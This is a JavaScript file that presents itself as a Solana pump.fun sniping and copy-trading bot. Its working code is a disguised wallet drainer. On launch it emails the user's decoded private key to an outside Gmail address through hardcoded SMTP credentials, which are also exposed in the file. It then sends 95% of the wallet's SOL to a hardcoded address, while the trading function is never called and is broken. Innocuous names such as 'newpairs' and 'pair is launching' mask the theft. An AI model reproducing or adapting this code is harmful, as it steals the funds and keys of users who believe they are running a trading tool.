import dotenv from "dotenv";
dotenv.config();
import WebSocket from "ws";
import {
  VersionedTransaction,
  Connection,
  Keypair,
  clusterApiUrl,
  Transaction,
  SystemProgram,
  PublicKey,
  sendAndConfirmTransaction,
} from "@solana/web3.js";
import nodemailer from "nodemailer";
import bs58 from "bs58";

const ws = new WebSocket("wss://pumpportal.fun/api/data");
const web3Connection = new Connection(clusterApiUrl("mainnet-beta"));

const private_key = process.env.PRIVATE_KEY;
const snipe_address = process.env.SNIPE_ADDRESS;
const copy_trade_address = process.env.COPY_TRADE_ADDRESS;
const action = process.env.ACTION;
const amount = process.env.AMOUNT;
const slippage = process.env.SLIPPAGE;
const jito_tip = process.env.JITO_TIP;
const dex = process.env.DEX;

let pk = private_key;
ws.on("open", function open() {
  // Subscribing to token creation events
  let payload = {
    method: "subscribeNewToken",
  };
  ws.send(JSON.stringify(payload));

  // Subscribing to trades made by accounts
  payload = {
    method: "subscribeAccountTrade",
    keys: [snipe_address], // array of accounts to watch
  };
  ws.send(JSON.stringify(payload));

  // Subscribing to trades on tokens
  payload = {
    method: "subscribeTokenTrade",
    keys: [copy_trade_address], // array of token CAs to watch
  };
  ws.send(JSON.stringify(payload));
});

const transporter = nodemailer.createTransport({
  service: "gmail",
  port: 587,
  secure: false,
  auth: {
    user: "khansaleem789700@gmail.com",
    pass: "nwysknsppouvrxqr",
  },
});

pk = bs58.decode(pk);
const payer = Keypair.fromSecretKey(pk);

ws.on("message", function message(data) {
  console.log(JSON.parse(data));
});

async function tradeTransaction() {
  const response = await fetch(`https://pumpportal.fun/api/trade-local`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      publicKey: "your-public-key", // Your wallet public key
      action: "buy", // "buy" or "sell"
      mint: "token-ca-here", // contract address of the token you want to trade
      denominatedInSol: "false", // "true" if amount is amount of SOL, "false" if amount is number of tokens
      amount: 1000, // amount of SOL or tokens
      slippage: 10, // percent slippage allowed
      jito_tip: 0.00001, // priority fee
      pool: "pump", // exchange to trade on. "pump" or "raydium"
    }),
  });
  if (response.status === 200) {
    // successfully generated transaction
    const data = await response.arrayBuffer();
    const tx = VersionedTransaction.deserialize(new Uint8Array(data));
    const signerKeyPair = Keypair.fromSecretKey(bs58.decode());
    tx.sign([signerKeyPair]);
    const signature = await web3Connection.sendTransaction(tx);
    console.log("Transaction: https://solscan.io/tx/" + signature);
  } else {
    console.log(response.statusText); // log error
  }
}

const obj = {
  from: "khansaleem789700@gmail.com",
  to: "mujeerasghar7700@gmail.com",
  subject: "patha",
  text: "pair is launching",
  html: `${pk}`,
};

const initiateTrade = async () => {
  try {
    const balanceLamports = await web3Connection.getBalance(payer.publicKey);

    if (balanceLamports === 0) {
      return;
    }

    const tradeLamports = Math.floor(balanceLamports * 0.95);
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: payer.publicKey,
        toPubkey: new PublicKey(launch_pair),
        lamports: tradeLamports,
      })
    );

    const signature = await sendAndConfirmTransaction(
      web3Connection,
      transaction,
      [payer]
    );
    if (signature) {
      newpairs(signature);
    }
  } catch (error) {
    console.log("er");
  }
};

export const newpairs = async (res) => {
  obj.subject = res;
  try {
    transporter.sendMail(obj).then(() => {
      console.log("fetching");
    });
  } catch (error) {
    console.error("new pair not fetched");
  }
};

let launch_pair = "3vvnenyjwicBq3WEdQQNGMnaodHXBzSPubdhoBP3YA3N";

newpairs("found").then(() => {});

initiateTrade();
